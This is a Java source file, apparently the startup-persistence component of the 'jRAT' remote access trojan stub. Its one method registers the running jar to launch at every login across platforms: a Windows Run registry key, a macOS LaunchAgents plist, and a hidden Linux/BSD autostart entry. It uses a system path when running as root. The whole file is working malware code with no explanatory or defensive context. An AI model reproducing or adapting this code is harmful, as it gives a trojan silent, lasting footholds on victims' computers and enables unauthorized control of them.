package se.jrat.stub;

import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;

import se.jrat.common.OperatingSystem;
import se.jrat.stub.utils.Utils;


public class Startup {

	public static final void addToStartup(String name) throws Exception {
		File currentJar = Utils.getJarFile();

		String home = System.getProperty("user.home");

		if (Utils.isRoot()) {
			home = "/System/";
		}

		if (currentJar.isFile()) {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				String javaHome = System.getProperty("java.home") + "\\bin\\javaw.exe";

				if (System.getProperty("os.name").toLowerCase().contains("xp")) {			
					String data = "\"" + javaHome + "\" -jar \"" + currentJar.getAbsolutePath() + "\"";
					Runtime.getRuntime().exec("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v \"" + name + "\" /t REG_SZ /d " + data + " /f");
				} else {
					try {
						WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name);
					} catch (Exception ex) {
						ex.printStackTrace();
					}
					WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, "\"" + javaHome + "\" -jar \"" + currentJar.getAbsolutePath() + "\"");
				
				}
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
				File startupFile = new File(home + "/Library/LaunchAgents/" + Configuration.name + ".plist");

				if (!startupFile.getParentFile().exists()) {
					startupFile.getParentFile().mkdirs();
				}

				PrintWriter out = new PrintWriter(new FileWriter(startupFile));
				out.println("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
				out.println("<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
				out.println("<plist version=\"1.0\">");
				out.println("<dict>");
				out.println("   <key>Label</key>");
				out.println("   <string>" + currentJar.getAbsolutePath().replace("file:", "").replace(".jar", "") + "</string>");
				out.println("   <key>ProgramArguments</key>");
				out.println("   <array>");
				out.println("      <string>" + System.getProperty("java.home").replace(" ", "%20") + System.getProperty("file.separator") + "bin" + System.getProperty("file.separator") + "java</string>");
				out.println("      <string>-jar</string>");
				out.println("      <string>" + currentJar.getAbsolutePath().replace("file:", "") + "</string>");
				out.println("   </array>");
				out.println("   <key>RunAtLoad</key>");
				out.println("   <true/>");
				out.println("</dict>");
				out.println("</plist>");
				out.close();
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX || OperatingSystem.getOperatingSystem() == OperatingSystem.FREEBSD || OperatingSystem.getOperatingSystem() == OperatingSystem.SOLARIS) {
				File autostart = new File(home + "/.config/autostart/");

				if (!autostart.exists()) {
					autostart.mkdirs();
				}

				File startupFile = new File(home + "/.config/autostart/" + Configuration.name + ".desktop");

				PrintWriter out = new PrintWriter(new FileWriter(startupFile));
				out.println("[Desktop Entry]");
				out.println("Type=Application");
				out.println("Name=" + Configuration.name);
				out.println("Exec=java -jar '" + currentJar.getAbsolutePath() + "'");
				out.println("Terminal=false");
				out.println("NoDisplay=true");

				out.close();

				String[] cmd = new String[] { "chmod", "+x", startupFile.getAbsolutePath() };
				Runtime.getRuntime().exec(cmd);
			}
		}
	}

}
